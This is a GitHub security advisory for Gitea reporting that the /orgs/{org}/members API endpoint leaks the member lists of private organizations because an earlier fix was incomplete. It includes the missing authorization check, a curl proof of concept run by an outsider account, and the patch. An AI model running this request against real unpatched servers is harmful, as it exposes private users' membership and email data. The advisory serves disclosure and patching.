{"credits": [{"type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/84002020?v=4", "events_url": "https://api.github.com/users/Razzlemouse/events{/privacy}", "followers_url": "https://api.github.com/users/Razzlemouse/followers", "following_url": "https://api.github.com/users/Razzlemouse/following{/other_user}", "gists_url": "https://api.github.com/users/Razzlemouse/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/Razzlemouse", "id": 84002020, "login": "Razzlemouse", "node_id": "MDQ6VXNlcjg0MDAyMDIw", "organizations_url": "https://api.github.com/users/Razzlemouse/orgs", "received_events_url": "https://api.github.com/users/Razzlemouse/received_events", "repos_url": "https://api.github.com/users/Razzlemouse/repos", "site_admin": false, "starred_url": "https://api.github.com/users/Razzlemouse/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Razzlemouse/subscriptions", "type": "User", "url": "https://api.github.com/users/Razzlemouse", "user_view_type": "public"}}], "cve_id": "CVE-2026-58427", "cvss": {"score": null, "vector_string": null}, "cvss_severities": {"cvss_v3": {"score": 0.0, "vector_string": null}, "cvss_v4": {"score": 0.0, "vector_string": null}}, "cwes": [{"cwe_id": "CWE-200", "name": "Exposure of Sensitive Information to an Unauthorized Actor"}, {"cwe_id": "CWE-863", "name": "Incorrect Authorization"}], "description": "## Summary
PR #38145 fixed ListPublicMembers and IsPublicMember but missed 
ListMembers. Any authenticated user can enumerate ALL members 
(not just public ones) of a private organization.

## Affected Versions
<= v1.26.4 (latest) and main branch

## Root Cause
routers/api/v1/org/member.go — ListMembers():

// Missing check:
if !organization.HasOrgOrUserVisible(ctx, 
    ctx.Org.Organization.AsUser(), ctx.Doer) {
    ctx.APIErrorNotFound()
    return
}

## Proof of Concept

# Setup: privateorg (private), alice = member, bob = outsider

# Bob lists ALL members of private org
curl -s "http://gitea/api/v1/orgs/privateorg/members" \
  -H "Authorization: token BOB_TOKEN"

# Result: HTTP 200
[{"login":"alice","email":"alice@test.com",...}]
# Expected: HTTP 404

## Note
This is an incomplete fix variant of PR #38145.
That PR fixed public_members endpoints only.
ListMembers (/orgs/{org}/members) remains unpatched.

## Fix
Add to ListMembers():
if !organization.HasOrgOrUserVisible(ctx, 
    ctx.Org.Organization.AsUser(), ctx.Doer) {
    ctx.APIErrorNotFound()
    return
}", "ghsa_id": "GHSA-prr9-9mp4-5gp2", "github_reviewed_at": "2026-07-21T21:49:00Z", "html_url": "https://github.com/advisories/GHSA-prr9-9mp4-5gp2", "identifiers": [{"type": "GHSA", "value": "GHSA-prr9-9mp4-5gp2"}, {"type": "CVE", "value": "CVE-2026-58427"}], "nvd_published_at": null, "published_at": "2026-07-21T21:49:00Z", "references": ["https://github.com/go-gitea/gitea/security/advisories/GHSA-prr9-9mp4-5gp2", "https://github.com/go-gitea/gitea/releases/tag/v1.27.0", "https://github.com/advisories/GHSA-prr9-9mp4-5gp2"], "repository_advisory_url": "https://api.github.com/repos/go-gitea/gitea/security-advisories/GHSA-prr9-9mp4-5gp2", "severity": "medium", "source_code_location": "https://github.com/go-gitea/gitea", "summary": "Gitea: Private org member list leaked via /members API endpoint — incomplete fix for PR #38145", "type": "reviewed", "updated_at": "2026-07-21T21:49:02Z", "url": "https://api.github.com/advisories/GHSA-prr9-9mp4-5gp2", "vulnerabilities": [{"first_patched_version": "1.27.0", "package": {"ecosystem": "go", "name": "gitea.dev"}, "vulnerable_functions": [], "vulnerable_version_range": "< 1.27.0"}], "withdrawn_at": null}

reasons: 資産不一致または判定情報不足

title: Gitea: Private org member list leaked via /members API endpoint — incomplete fix for PR #38145
